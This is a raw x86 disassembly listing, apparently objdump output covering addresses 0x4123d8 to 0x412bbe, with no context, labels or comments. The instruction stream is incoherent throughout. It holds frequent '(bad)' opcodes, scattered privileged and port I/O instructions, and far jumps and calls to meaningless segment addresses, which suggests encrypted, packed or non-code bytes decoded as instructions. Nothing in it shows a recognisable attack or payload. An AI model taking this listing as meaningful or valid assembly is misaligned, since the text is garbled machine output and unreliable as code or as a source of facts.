  4123d8:	sub    cl,BYTE PTR [ebp-0x7cd8d19e]
  4123de:	cmp    bl,ah
  4123e0:	ror    DWORD PTR [ebp+0x1d],cl
  4123e3:	fcom   QWORD PTR [ebx]
  4123e5:	xlat   BYTE PTR ds:[ebx]
  4123e6:	add    eax,ecx
  4123e8:	nop
  4123e9:	add    ebp,edx
  4123eb:	repz fnstenv cs:[eax-0x95d71f]
  4123f3:	(bad)  
  4123f4:	xor    BYTE PTR cs:[ebx-0x71],ch
  4123f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123f9:	mov    edx,0xc8e82a26
  4123fe:	dec    edx
  4123ff:	ins    DWORD PTR es:[edi],dx
  412400:	dec    esp
  412401:	lds    ecx,FWORD PTR [ebx]
  412403:	in     al,dx
  412404:	cmc    
  412405:	sahf   
  412406:	add    ecx,DWORD PTR [ebx-0x4db15818]
  41240c:	gs iret 
  41240e:	mov    ds:0xf0e4cd41,eax
  412413:	sti    
  412414:	jno    0x4123d4
  412416:	push   es
  412417:	imul   edx,DWORD PTR [edi+0x41],0x3f
  41241b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41241c:	aas    
  41241d:	mov    dh,0x6d
  41241f:	mov    al,ds:0x89ab1d34
  412424:	sub    ebp,DWORD PTR [ebp+0x11]
  412427:	xchg   ebp,eax
  412428:	mov    dl,0x3c
  41242a:	adc    al,0xa5
  41242c:	cmc    
  41242d:	or     cl,BYTE PTR [ecx+0x46]
  412430:	jne    0x412436
  412432:	push   ebp
  412434:	sahf   
  412435:	mov    al,ds:0x64c8b3f8
  41243a:	pushf  
  41243b:	inc    ah
  41243d:	popa   
  41243e:	aas    
  41243f:	jge    0x4123f4
  412441:	stos   DWORD PTR es:[edi],eax
  412442:	mov    BYTE PTR [esi+0x2f],cl
  412445:	gs stos BYTE PTR es:[edi],al
  412447:	idiv   DWORD PTR ds:0xa287d349
  41244d:	cmp    dh,cl
  41244f:	and    ebp,DWORD PTR [eax+0x2bb95711]
  412455:	inc    eax
  412456:	xor    BYTE PTR [eax-0x7124d609],bh
  41245c:	jbe    0x41249e
  41245e:	cmp    ebp,DWORD PTR [edx]
  412460:	jl     0x412452
  412462:	ins    DWORD PTR es:[edi],dx
  412463:	jnp    0x4124b1
  412465:	sqrtps xmm3,XMMWORD PTR [ebp-0x2bf6762e]
  41246c:	(bad)  
  41246d:	jnp    0x41244e
  41246f:	dec    ebp
  412470:	push   ecx
  412471:	outs   dx,BYTE PTR ds:[esi]
  412472:	(bad)  
  412473:	jmp    0x412410
  412475:	dec    ebx
  412476:	retf   
  412477:	jp     0x412446
  412479:	cmc    
  41247a:	adc    esp,DWORD PTR [esi*2+0x719e583c]
  412481:	ss lock cmp esi,edx
  412485:	and    DWORD PTR [esi+0x14c9256],ecx
  41248b:	lahf   
  41248c:	test   DWORD PTR ds:0x44e6bd0d,0x25b330b8
  412496:	rcr    BYTE PTR [ebp-0x577de8ca],cl
  41249c:	sbb    al,0xe5
  41249e:	aam    0x1
  4124a0:	xor    DWORD PTR [ebx],ebx
  4124a2:	scas   eax,DWORD PTR es:[edi]
  4124a3:	push   edx
  4124a4:	adc    dh,BYTE PTR [esi+eax*1-0xb]
  4124a8:	test   BYTE PTR [esi+edi*2-0x41],0x50
  4124ad:	sub    ch,cl
  4124af:	xor    DWORD PTR ds:0x7997b4ce,ebx
  4124b5:	pop    ebx
  4124b6:	inc    esi
  4124b7:	push   ebx
  4124b8:	ds inc esi
  4124ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124bb:	fisubr DWORD PTR [edi+0x1b734545]
  4124c1:	(bad)  
  4124c2:	stc    
  4124c3:	mov    edx,0x74a9320e
  4124c8:	push   eax
  4124c9:	movhlps xmm1,xmm1
  4124cc:	fbld   TBYTE PTR [ecx-0x396651f2]
  4124d2:	int    0x46
  4124d4:	repz (bad) 
  4124d6:	jno    0x4124ff
  4124d8:	pusha  
  4124d9:	mov    ah,0xda
  4124db:	push   esi
  4124dc:	stos   BYTE PTR es:[edi],al
  4124dd:	sbb    eax,0xe60b0af3
  4124e2:	loopne 0x412499
  4124e4:	sbb    BYTE PTR [eax+0x2f4d395],cl
  4124ea:	xor    esp,0xffffffb0
  4124ed:	push   esp
  4124ee:	cli    
  4124ef:	pusha  
  4124f0:	shl    BYTE PTR fs:[edi-0x2c],0x5d
  4124f5:	dec    ecx
  4124f6:	(bad)  
  4124f7:	iret   
  4124f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124f9:	sbb    al,BYTE PTR [edi+eax*4]
  4124fc:	pop    eax
  4124fd:	mov    ss,WORD PTR [ebp-0x6f]
  412500:	sub    DWORD PTR [ebx+0x4cc64d92],esi
  412506:	dec    esp
  412507:	dec    eax
  412508:	pop    eax
  412509:	jb     0x4124c8
  41250b:	jmp    0xc9f5:0xc1557324
  412512:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412513:	mov    WORD PTR [ebx],cs
  412515:	add    DWORD PTR [esi+0x1e],edi
  412518:	xchg   ebx,eax
  412519:	and    al,0x19
  41251b:	mov    eax,ds:0xd148097b
  412520:	lea    esi,[eax-0x5531009]
  412526:	adc    BYTE PTR [edi],ch
  412528:	clc    
  412529:	shr    DWORD PTR [ebx-0x67],cl
  41252c:	sub    edx,DWORD PTR [ecx]
  41252e:	jmp    0xb2a4:0xea7d82b5
  412535:	pusha  
  412536:	sub    esi,DWORD PTR [eax-0x4f]
  412539:	mov    edi,0xfe08171c
  41253e:	into   
  41253f:	fist   DWORD PTR [eax+0x49092892]
  412545:	rcr    edx,cl
  412547:	jne    0x41252e
  412549:	sub    eax,0x2f510c52
  41254e:	rcr    DWORD PTR [ecx+0xd],0x6d
  412552:	out    0x49,al
  412554:	mul    BYTE PTR [ecx]
  412556:	dec    edx
  412557:	pop    esp
  412558:	mov    esp,0x63d5b0d8
  41255d:	add    DWORD PTR [edi-0x33f14632],ecx
  412563:	in     al,0x26
  412565:	scas   al,BYTE PTR es:[edi]
  412566:	mov    esi,0xf94fe182
  41256b:	imul   edi,eax,0x5a
  41256e:	fnstsw WORD PTR [ebp+0x6958391]
  412574:	enter  0x599f,0xf7
  412578:	jns    0x4125b2
  41257a:	rol    BYTE PTR [edx-0x151304fe],1
  412580:	mov    ds:0xd189644b,al
  412585:	repnz push 0x43
  412588:	jnp    0x412556
  41258a:	sar    dh,1
  41258c:	ins    BYTE PTR es:[edi],dx
  41258d:	(bad)  
  41258e:	and    esp,edx
  412590:	ins    DWORD PTR es:[edi],dx
  412591:	and    eax,0x8c6bf116
  412596:	xchg   BYTE PTR [eax+esi*1-0x3d],bl
  41259a:	ror    esp,0x4d
  41259d:	aad    0xbb
  41259f:	xchg   DWORD PTR [ecx],ebx
  4125a1:	in     al,dx
  4125a2:	imul   esi,DWORD PTR ds:0xb22b9516,0x6b2d88e1
  4125ac:	arpl   WORD PTR [edi-0x70abc1a8],bp
  4125b2:	loope  0x412626
  4125b4:	sub    al,0x71
  4125b6:	aaa    
  4125b7:	das    
  4125b8:	jge    0x41259a
  4125ba:	out    dx,al
  4125bb:	mov    esi,ebx
  4125bd:	fnstcw WORD PTR [edi]
  4125bf:	in     al,0xd5
  4125c1:	jb     0x41255b
  4125c3:	in     eax,dx
  4125c4:	sbb    al,0xfe
  4125c6:	jo     0x41258f
  4125c8:	dec    esi
  4125c9:	add    edi,ebp
  4125cb:	es jmp 0xc200d500
  4125d1:	jbe    0x4125cd
  4125d3:	jae    0x412609
  4125d5:	adc    edx,DWORD PTR [edi]
  4125d7:	or     BYTE PTR [ebp+0x15b09faa],bh
  4125dd:	cmp    BYTE PTR [edi-0x25],bh
  4125e0:	pop    edi
  4125e1:	xor    al,0xa5
  4125e3:	adc    BYTE PTR ds:0x18c0fb72,0x48
  4125ea:	fcom   QWORD PTR ds:0x8fed22d6
  4125f0:	stos   DWORD PTR es:[edi],eax
  4125f1:	addr16 jnp 0x412611
  4125f4:	jg     0x4125d3
  4125f6:	push   esp
  4125f7:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125f9:	pop    esi
  4125fa:	mov    al,ds:0x70ed40f3
  4125ff:	scas   al,BYTE PTR es:[edi]
  412600:	shl    DWORD PTR [eax],cl
  412602:	mov    eax,ds:0x9f26033a
  412607:	mov    edx,0x85ce64d6
  41260c:	fsub   QWORD PTR [ebx+edx*8+0x6d]
  412610:	fld    DWORD PTR [edi-0x64]
  412613:	(bad)  
  412614:	or     cl,BYTE PTR [ecx]
  412616:	cdq    
  412617:	and    cl,BYTE PTR [ebp+0x42a678af]
  41261d:	sub    BYTE PTR [ebx*8-0x66b524d],dh
  412624:	arpl   sp,ax
  412626:	pop    ebx
  412627:	paddd  mm7,QWORD PTR [eax+0x70]
  41262b:	and    DWORD PTR [ebp-0x5f],esi
  41262e:	fs pop ecx
  412630:	in     eax,dx
  412631:	push   edx
  412633:	gs xchg esi,eax
  412635:	mov    es,WORD PTR [ebp+0x3b]
  412638:	ret    0xa180
  41263b:	pop    ebx
  41263c:	adc    DWORD PTR [ecx+0x2a],esp
  41263f:	add    eax,0xbca90996
  412644:	iret   
  412645:	dec    esp
  412646:	icebp  
  412647:	add    eax,0x2d891936
  41264c:	push   0xcbc13ed6
  412651:	jmp    0x2ae51ce4
  412656:	lods   eax,DWORD PTR ds:[esi]
  412657:	imul   ebp,DWORD PTR [esi-0x3faac8bf],0x89126bd6
  412661:	mov    dl,0x1
  412663:	mov    ebp,0xa5a436c0
  412668:	push   esp
  412669:	xchg   edx,eax
  41266a:	or     DWORD PTR [esi+0x2de95ed2],0x64893989
  412674:	add    cl,al
  412676:	mov    ebp,DWORD PTR ss:[ebx-0xa]
  41267a:	cmp    ch,dh
  41267c:	jecxz  0x412672
  41267e:	mov    ebx,0x9de60731
  412683:	inc    ebx
  412684:	adc    DWORD PTR [ecx+0x24a17bb6],0xffffffb1
  41268b:	mov    dh,dh
  41268d:	sub    cl,BYTE PTR [ebp-0x201f558b]
  412693:	adc    eax,0x6ca08b19
  412698:	mov    esp,DWORD PTR es:[eax-0x5bce0844]
  41269f:	sahf   
  4126a0:	sar    BYTE PTR [ebx+0x39],1
  4126a3:	xor    ch,BYTE PTR [edx+0x31cdd0fb]
  4126a9:	outs   dx,BYTE PTR ds:[esi]
  4126aa:	and    bl,ah
  4126ac:	sub    ah,BYTE PTR [edi+eax*2-0xa9286e2]
  4126b3:	jle    0x412706
  4126b5:	pushf  
  4126b6:	loope  0x4126dd
  4126b8:	cmp    BYTE PTR [esi+eiz*8],0xa9
  4126bc:	in     al,dx
  4126bd:	adc    DWORD PTR cs:[esi+0x63],esi
  4126c1:	adc    dl,BYTE PTR [ecx-0x53]
  4126c4:	iret   
  4126c5:	or     eax,DWORD PTR [esi]
  4126c7:	not    DWORD PTR [ebx+ebx*4-0x5141c528]
  4126ce:	adc    DWORD PTR [eax],ebp
  4126d0:	mov    dh,0x56
  4126d2:	fiadd  DWORD PTR [ecx-0x67]
  4126d5:	mov    eax,ds:0x5556241b
  4126da:	retf   
  4126db:	sub    al,0x6e
  4126dd:	rol    DWORD PTR fs:[edi+0x0],0x2e
  4126e2:	stos   BYTE PTR es:[edi],al
  4126e3:	sub    ebx,ebx
  4126e5:	(bad)  [ebp+0x66]
  4126e8:	push   ebp
  4126e9:	div    esp
  4126eb:	loopne 0x412749
  4126ed:	loop   0x412704
  4126ef:	cld    
  4126f0:	scas   eax,DWORD PTR es:[edi]
  4126f1:	push   es
  4126f2:	stos   BYTE PTR es:[edi],al
  4126f3:	jo     0x412722
  4126f5:	stos   BYTE PTR es:[edi],al
  4126f6:	enter  0xab0,0x48
  4126fa:	add    DWORD PTR [edx-0x8],esi
  4126fd:	mov    eax,0x7f8febf0
  412702:	dec    eax
  412703:	(bad)  
  412704:	out    0xb2,eax
  412706:	idiv   edi
  412708:	pop    ecx
  412709:	std    
  41270a:	push   ss
  41270b:	dec    edx
  41270c:	sub    bl,0x27
  41270f:	pop    ss
  412710:	lea    esp,[esi+ebx*2+0x642aaf45]
  412717:	jns    0x412781
  412719:	xchg   ebx,eax
  41271a:	jne    0x412765
  41271c:	pusha  
  41271d:	jb     0x412768
  41271f:	rcr    BYTE PTR [eax-0x1d8b99b1],1
  412725:	mov    al,0x2c
  412727:	imul   edi,edx,0x64
  41272a:	pop    ecx
  41272b:	fst    QWORD PTR [ecx+esi*2]
  41272e:	in     al,dx
  41272f:	(bad)  
  412730:	cdq    
  412731:	aam    0x3f
  412733:	aam    0x3e
  412735:	(bad)  
  412736:	retf   
  412737:	hlt    
  412738:	mov    dh,0xd9
  41273a:	cli    
  41273b:	jmp    0x412753
  41273d:	imul   eax,DWORD PTR [edx+0x3db91800],0xfd8d82ad
  412747:	retf   0x941f
  41274a:	jne    0x4126fb
  41274c:	adc    DWORD PTR [ecx+0x3bc0aa9],edx
  412752:	xchg   edx,eax
  412753:	mov    dl,0x35
  412755:	repnz dec eax
  412757:	into   
  412758:	jbe    0x412741
  41275a:	sbb    ebp,DWORD PTR [ebx-0x45649261]
  412760:	mov    dl,0x9e
  412762:	adc    ch,BYTE PTR [ecx-0x27]
  412765:	cmp    al,BYTE PTR [esi]
  412767:	aaa    
  412768:	mov    esp,0x3c22bf8f
  41276d:	jecxz  0x4127e4
  41276f:	test   al,0x3c
  412771:	imul   edx,DWORD PTR [edx-0x56b0b658],0xffffffe3
  412778:	push   ecx
  412779:	imul   ebp,DWORD PTR [edx+ebp*4-0x1d091e6f],0xffffffd5
  412781:	pop    eax
  412782:	jecxz  0x412784
  412784:	ja     0x4127ec
  412786:	and    esp,DWORD PTR [edi-0xa00800e]
  41278c:	retf   0x8c31
  41278f:	inc    ecx
  412790:	xlat   BYTE PTR ds:[ebx]
  412791:	popa   
  412792:	push   ss
  412793:	arpl   WORD PTR [ebx+0x6badcff4],ax
  412799:	mov    esp,DWORD PTR [eax]
  41279b:	mov    esp,esp
  41279d:	xchg   ebx,eax
  41279e:	cmp    ch,BYTE PTR [esi]
  4127a0:	jae    0x412753
  4127a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127a3:	div    DWORD PTR [ebx]
  4127a5:	mov    eax,ds:0x30656ebe
  4127aa:	cmp    eax,0x1025c2de
  4127af:	mov    al,0x37
  4127b1:	sbb    ah,BYTE PTR [ebx+0x67]
  4127b4:	int    0xc5
  4127b6:	scas   al,BYTE PTR es:[edi]
  4127b7:	pop    ds
  4127b8:	push   es
  4127b9:	aas    
  4127ba:	push   0xfffffff1
  4127bc:	shl    DWORD PTR [ecx+0x1aa48309],0x1b
  4127c3:	std    
  4127c4:	dec    ebx
  4127c5:	push   ebp
  4127c6:	pop    esp
  4127c7:	pop    eax
  4127c8:	stc    
  4127c9:	adc    cx,si
  4127cc:	aaa    
  4127cd:	jns    0x412825
  4127cf:	repnz sub BYTE PTR [edi+eax*2-0x77959b03],dl
  4127d7:	and    al,0xb7
  4127d9:	inc    edi
  4127da:	mov    edi,0x4bc12b7f
  4127df:	les    ebp,FWORD PTR [ebx]
  4127e1:	sbb    DWORD PTR [esi-0x32],edx
  4127e4:	xchg   esi,eax
  4127e5:	cmp    bl,bl
  4127e7:	xlat   BYTE PTR ds:[ebx]
  4127e8:	jo     0x4127de
  4127ea:	fisttp DWORD PTR [esi+0x4b831ea5]
  4127f0:	mov    edx,0xbbaa517b
  4127f5:	clc    
  4127f6:	mov    eax,0xf172ffa0
  4127fb:	xor    BYTE PTR [ebp+edi*2-0x68],dh
  4127ff:	adc    al,BYTE PTR [ebx+eiz*8+0x2f]
  412803:	lahf   
  412804:	inc    esi
  412805:	push   ds
  412806:	cwde   
  412807:	mov    ebx,gs
  412809:	not    DWORD PTR [esi]
  41280b:	fsub   QWORD PTR [edx-0x76bb2683]
  412811:	mov    bh,0xb6
  412813:	cmp    DWORD PTR [ebx+ebp*4],ecx
  412816:	mov    eax,0x4e5d81c6
  41281b:	inc    edx
  41281c:	pushf  
  41281d:	push   ds
  41281e:	sahf   
  41281f:	retf   
  412820:	std    
  412821:	or     BYTE PTR [ebx+edi*8-0xf],dh
  412825:	test   eax,0x15775e73
  41282a:	xor    BYTE PTR [ebx+0xe],al
  41282d:	sub    eax,0x78b669c9
  412832:	push   eax
  412833:	inc    edx
  412834:	and    al,0x19
  412836:	xor    bh,BYTE PTR [edi+edi*4+0x65cbd1]
  41283d:	sub    ch,bl
  41283f:	fistp  DWORD PTR [eax]
  412841:	mov    ds:0xf9e429e4,eax
  412846:	dec    esp
  412847:	cdq    
  412848:	pcmpgtw mm3,QWORD PTR [edx]
  41284b:	das    
  41284c:	push   ss
  41284d:	cmp    edi,DWORD PTR ds:0x709f20f7
  412853:	ja     0x4128c3
  412855:	out    0xa8,al
  412857:	out    dx,al
  412858:	or     ebp,edx
  41285a:	sub    DWORD PTR [eax+esi*1+0x374bb7ad],edi
  412861:	xor    al,0xf9
  412863:	or     dl,ch
  412865:	fbstp  TBYTE PTR [eax]
  412867:	push   cs
  412868:	test   al,0x5c
  41286a:	(bad)  
  41286b:	xchg   ebx,eax
  41286c:	mov    al,0xd6
  41286e:	sub    al,0x4
  412870:	xchg   DWORD PTR ds:[eax],edi
  412873:	aad    0xeb
  412875:	xchg   ecx,eax
  412876:	mov    bl,BYTE PTR [eax+0x6d731f5d]
  41287c:	mov    bl,0x2b
  41287e:	push   ds
  41287f:	mov    ebx,0x21dcd7fa
  412884:	mov    ebp,0xf204ba0
  412889:	adc    edi,DWORD PTR [esi-0x6ccfb8a3]
  41288f:	dec    ebx
  412890:	cmp    eax,0x7122e748
  412895:	add    ebx,eax
  412897:	mov    esp,0xde27861b
  41289c:	adc    dh,BYTE PTR ds:0xeae5b67a
  4128a2:	repz or al,0x76
  4128a5:	stos   DWORD PTR es:[edi],eax
  4128a6:	xchg   DWORD PTR [edi-0x70],eax
  4128a9:	pop    ds
  4128aa:	stos   DWORD PTR es:[edi],eax
  4128ab:	sar    BYTE PTR [edi],1
  4128ad:	mov    edx,ds
  4128af:	adc    al,0x2f
  4128b1:	jo     0x41283b
  4128b3:	xchg   DWORD PTR [ecx+edi*2],esi
  4128b6:	jecxz  0x41290d
  4128b8:	push   eax
  4128b9:	addr16 (bad) 
  4128bb:	in     al,0x7
  4128bd:	ret    0x78eb
  4128c0:	xor    bl,BYTE PTR [edi+0x53]
  4128c3:	mov    cl,0x29
  4128c5:	call   0xa4472234
  4128ca:	mov    WORD PTR [edx],?
  4128cc:	pop    ecx
  4128cd:	or     DWORD PTR [eax],ebx
  4128cf:	out    0x22,al
  4128d1:	adc    esp,DWORD PTR [eax-0x5e00c4b5]
  4128d7:	call   0x9de5:0xb8297628
  4128de:	xor    BYTE PTR [edx+edi*8],al
  4128e1:	out    0x89,al
  4128e3:	sbb    edi,DWORD PTR [eax-0x1cc26326]
  4128e9:	mov    cl,0xc2
  4128eb:	sbb    edx,DWORD PTR [edi+0x2a0d3c92]
  4128f1:	inc    ebp
  4128f2:	adc    DWORD PTR [ebx-0x707e9233],ebx
  4128f8:	imul   ecx,DWORD PTR [eax+0x2cb6afb],0x3d49ccde
  412902:	sbb    DWORD PTR [edx+0x639ac782],0x39
  412909:	gs je  0x4128ee
  41290c:	jmp    FWORD PTR [esi-0x988539e]
  412912:	adc    al,0x8
  412914:	add    BYTE PTR [ebx],ah
  412916:	xor    al,0xd4
  412918:	sbb    edx,eax
  41291a:	add    al,0xfc
  41291c:	idiv   BYTE PTR [edx-0xe]
  41291f:	mov    ebx,0xef67102d
  412924:	nop
  412925:	inc    ecx
  412926:	sti    
  412927:	ja     0x412994
  412929:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41292a:	ror    BYTE PTR [edx+0x4a39f703],0x4b
  412931:	pop    es
  412932:	push   ebx
  412933:	mov    ds,WORD PTR [edi]
  412935:	pop    edx
  412936:	xor    BYTE PTR [edi+0x9],0x7
  41293a:	data16 jle 0x41296d
  41293d:	lds    esi,FWORD PTR [ebp+0x30]
  412940:	f2xm1  
  412942:	adc    eax,0x31ce7d72
  412947:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412948:	enter  0x4316,0x67
  41294c:	in     al,dx
  41294d:	inc    edx
  41294e:	mov    al,ds:0x56582ae2
  412953:	and    al,0x5f
  412955:	loopne 0x412942
  412957:	pop    ebp
  412958:	xor    DWORD PTR [edx-0x46],ecx
  41295b:	sti    
  41295c:	lds    ebx,FWORD PTR [eax-0x394b9474]
  412962:	jmp    0x4129d7
  412964:	setle  dh
  412967:	aas    
  412968:	loopne 0x412904
  41296a:	addr16 idiv al
  41296d:	jp     0x412902
  41296f:	mov    esi,0xd2cdee00
  412974:	in     al,dx
  412975:	mov    al,ds:0x16dff83c
  41297a:	jmp    0xb700a830
  41297f:	inc    esi
  412980:	loopne 0x412997
  412982:	ins    DWORD PTR es:[edi],dx
  412983:	enter  0x61b3,0x2f
  412987:	aas    
  412988:	or     eax,0x11c2e0f0
  41298d:	mov    ah,0x5d
  41298f:	xchg   ebp,eax
  412990:	and    BYTE PTR [ebx+edx*2-0x2547dfc4],0xe3
  412998:	push   eax
  412999:	sub    DWORD PTR [ebx-0x3d],edx
  41299c:	je     0x41297c
  41299e:	sahf   
  41299f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129a0:	jne    0x41299e
  4129a2:	xor    cl,cl
  4129a4:	scas   eax,DWORD PTR es:[edi]
  4129a5:	repnz adc BYTE PTR [esi-0x3bae1254],ah
  4129ac:	xor    BYTE PTR [edi],ah
  4129ae:	(bad)  
  4129b0:	jno    0x412944
  4129b2:	das    
  4129b3:	imul   ecx,DWORD PTR [esi-0x29e3080f],0x5d
  4129ba:	push   esi
  4129bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129bc:	xor    esi,DWORD PTR [eax+0xa]
  4129bf:	(bad)  
  4129c0:	repnz push ebp
  4129c2:	xchg   edi,eax
  4129c3:	cwde   
  4129c4:	in     al,dx
  4129c5:	xor    DWORD PTR ss:[ebx+ecx*1+0x21755f9],ebp
  4129cd:	mov    bh,0x20
  4129cf:	or     eax,0xb0e0472
  4129d4:	cmp    DWORD PTR ds:0x85cdc980,eax
  4129da:	popf   
  4129db:	and    DWORD PTR [esi-0x5f2ee4c7],edx
  4129e1:	cwde   
  4129e2:	pop    edx
  4129e3:	inc    esp
  4129e4:	cld    
  4129e5:	cmp    BYTE PTR [ebp+0x24],al
  4129e8:	push   cs
  4129e9:	mov    bl,0xc9
  4129eb:	pop    ecx
  4129ec:	scas   eax,DWORD PTR es:[edi]
  4129ed:	add    al,0xd0
  4129ef:	adc    al,0x1a
  4129f1:	push   ds
  4129f2:	and    eax,0xc16e6625
  4129f7:	sbb    dh,BYTE PTR [ebp+ebp*4-0x2677f412]
  4129fe:	or     bl,BYTE PTR [edx]
  412a00:	or     al,0x94
  412a02:	les    esp,FWORD PTR [ebx-0x1f]
  412a05:	mov    edi,ebp
  412a07:	inc    ebp
  412a08:	call   ebx
  412a0a:	std    
  412a0b:	call   0x28b8:0xbbc3f06c
  412a12:	mov    edx,0x9d276842
  412a17:	std    
  412a18:	mov    ch,0x9b
  412a1a:	iret   
  412a1b:	and    al,0xc2
  412a1d:	jg     0x4129b6
  412a1f:	xchg   esi,eax
  412a20:	test   DWORD PTR [edi+ebp*1-0x7e],esp
  412a24:	jmp    0x3c2:0xae0f9b0a
  412a2b:	out    dx,eax
  412a2c:	loop   0x412aa4
  412a2e:	pop    ds
  412a2f:	or     DWORD PTR [ebx+0x2bb6353c],edx
  412a35:	into   
  412a36:	sbb    al,0xc7
  412a38:	xchg   ebp,eax
  412a39:	mov    BYTE PTR [edi],bh
  412a3b:	inc    bl
  412a3d:	retf   0x8aa3
  412a40:	rcr    BYTE PTR ds:0x37cf02a7,1
  412a46:	jb     0x412a0f
  412a48:	mov    esp,0x3b223bfe
  412a4d:	test   BYTE PTR ds:0x1e7add5f,ch
  412a53:	and    DWORD PTR [edi-0x55],edi
  412a56:	dec    esp
  412a57:	inc    eax
  412a58:	push   0xffffff94
  412a5a:	sbb    DWORD PTR [edi-0x45],edi
  412a5d:	xchg   ebx,eax
  412a5e:	dec    esi
  412a5f:	leave  
  412a60:	and    al,0x3d
  412a62:	cmp    dl,dl
  412a64:	call   0xc371:0x1da89fa0
  412a6b:	shl    DWORD PTR [esi+0x24],1
  412a6e:	dec    ebx
  412a6f:	test   al,0x8d
  412a71:	xor    eax,0xba0d132f
  412a76:	or     BYTE PTR [eax*8+0xcbce2f9],cl
  412a7d:	or     edx,DWORD PTR [esi-0x12]
  412a80:	push   cs
  412a81:	(bad)  
  412a82:	pop    ecx
  412a83:	xlat   BYTE PTR ds:[ebx]
  412a84:	mov    bl,0x7b
  412a86:	inc    eax
  412a87:	lods   eax,DWORD PTR ds:[esi]
  412a88:	arpl   WORD PTR [ecx],dx
  412a8a:	xor    eax,0x3ff83720
  412a8f:	hlt    
  412a90:	mov    al,0xac
  412a92:	pusha  
  412a93:	xchg   edi,eax
  412a94:	sub    eax,0x214aa6e2
  412a99:	cld    
  412a9a:	test   eax,0xd61dfd24
  412a9f:	out    0x34,eax
  412aa1:	aas    
  412aa2:	push   0x210f34a6
  412aa7:	fistp  WORD PTR [ebx-0x6fd2d345]
  412aad:	sub    BYTE PTR [edi],bl
  412aaf:	inc    eax
  412ab0:	mov    cs,eax
  412ab2:	push   cs
  412ab3:	ret    
  412ab4:	push   esp
  412ab5:	inc    esp
  412ab6:	imul   ebx,DWORD PTR [ebx-0x313c0067],0xfffffff4
  412abd:	xchg   ecx,eax
  412abe:	test   BYTE PTR [ecx],bl
  412ac0:	inc    ecx
  412ac1:	retf   
  412ac2:	stos   DWORD PTR es:[edi],eax
  412ac3:	mov    edi,0x4bc6e0f8
  412ac8:	push   cs
  412ac9:	mov    al,ds:0xd41ace88
  412ace:	(bad)  
  412acf:	pusha  
  412ad0:	cli    
  412ad1:	mov    es,WORD PTR [ebx-0x50]
  412ad4:	or     al,0xc
  412ad6:	mov    ebp,0x8bd01205
  412adb:	enter  0x1fd1,0x61
  412adf:	mov    WORD PTR [ebx-0x45],es
  412ae2:	stos   BYTE PTR es:[edi],al
  412ae3:	(bad)  
  412ae4:	jo     0x412b52
  412ae6:	cmp    edx,DWORD PTR [edx]
  412ae8:	pop    esp
  412ae9:	out    0x5f,eax
  412aeb:	cld    
  412aec:	les    eax,FWORD PTR [eax-0x7c]
  412aef:	aam    0x5
  412af1:	mov    ecx,0x9666d8e8
  412af6:	loopne 0x412ace
  412af8:	cmp    BYTE PTR [ebx-0x35],ah
  412afb:	js     0x412b37
  412afd:	mov    edi,0x9abef357
  412b02:	ret    
  412b03:	leave  
  412b04:	out    dx,eax
  412b05:	mov    bl,0x97
  412b07:	add    esi,DWORD PTR [ecx-0x98f5a48]
  412b0d:	in     eax,0x88
  412b0f:	push   es
  412b10:	repz push ss
  412b12:	mov    dh,0x4a
  412b14:	mov    ebx,0x5262c01a
  412b19:	inc    ebp
  412b1a:	adc    dh,BYTE PTR [edi-0x4aaffb2c]
  412b20:	pushf  
  412b21:	add    ch,al
  412b23:	ins    DWORD PTR es:[edi],dx
  412b24:	test   eax,0x7ee031de
  412b29:	fistp  WORD PTR [esi-0x44a0d08f]
  412b2f:	enter  0x5aa8,0x11
  412b33:	or     DWORD PTR [ebx-0x3b90331c],eax
  412b39:	retf   0xb5f5
  412b3c:	pop    edx
  412b3d:	dec    ebx
  412b3e:	pop    edi
  412b3f:	das    
  412b40:	rcr    BYTE PTR [eax],cl
  412b42:	dec    edx
  412b43:	sti    
  412b44:	mov    ch,0xa9
  412b46:	xlat   BYTE PTR ds:[ebx]
  412b47:	jmp    0x412ba1
  412b49:	mov    ds:0xa74c2806,al
  412b4e:	leave  
  412b4f:	push   ss
  412b50:	xchg   ebx,eax
  412b51:	ror    DWORD PTR [esp+edx*8],cl
  412b54:	xchg   esp,eax
  412b55:	and    eax,0xea9fd218
  412b5a:	sub    BYTE PTR [eax+eax*2],bh
  412b5d:	push   ecx
  412b5e:	dec    eax
  412b5f:	shr    bh,1
  412b61:	pop    edx
  412b62:	jp     0x412ae6
  412b64:	push   ecx
  412b65:	and    BYTE PTR [ebx+esi*1],dh
  412b68:	mov    bl,0x44
  412b6a:	into   
  412b6b:	cmc    
  412b6c:	mov    dl,0x23
  412b6e:	pop    ss
  412b6f:	cli    
  412b70:	sub    BYTE PTR [ebx+0x5],dl
  412b73:	mov    ?,ecx
  412b75:	adc    eax,0x3c28eec9
  412b7a:	int3   
  412b7b:	outs   dx,BYTE PTR ds:[esi]
  412b7c:	data16 icebp 
  412b7e:	(bad)  
  412b7f:	or     al,0x75
  412b81:	push   ss
  412b82:	in     eax,dx
  412b83:	mov    bl,0x90
  412b85:	sahf   
  412b86:	cmp    eax,0x3c6729d3
  412b8b:	iret   
  412b8c:	out    dx,al
  412b8d:	lods   al,BYTE PTR ds:[esi]
  412b8e:	mov    BYTE PTR [ebp-0xf023c2f],ah
  412b94:	bound  ebx,QWORD PTR [edi]
  412b96:	add    al,0x6f
  412b98:	call   0x7af6e281
  412b9d:	xchg   edi,eax
  412b9e:	and    ebx,esp
  412ba0:	push   ebp
  412ba1:	cmp    esi,ebp
  412ba3:	push   ss
  412ba4:	jns    0x412b4e
  412ba6:	imul   esp,DWORD PTR [edi],0xffffffce
  412ba9:	inc    edx
  412baa:	pop    es
  412bab:	mov    ah,0x89
  412bad:	dec    eax
  412bae:	cld    
  412baf:	je     0x412baf
  412bb1:	adc    eax,0x9439d2a1
  412bb6:	js     0x412bc0
  412bb8:	push   eax
  412bb9:	mov    ebp,0x8c22dd9b
  412bbe:	add    eax,0xfcc5147c
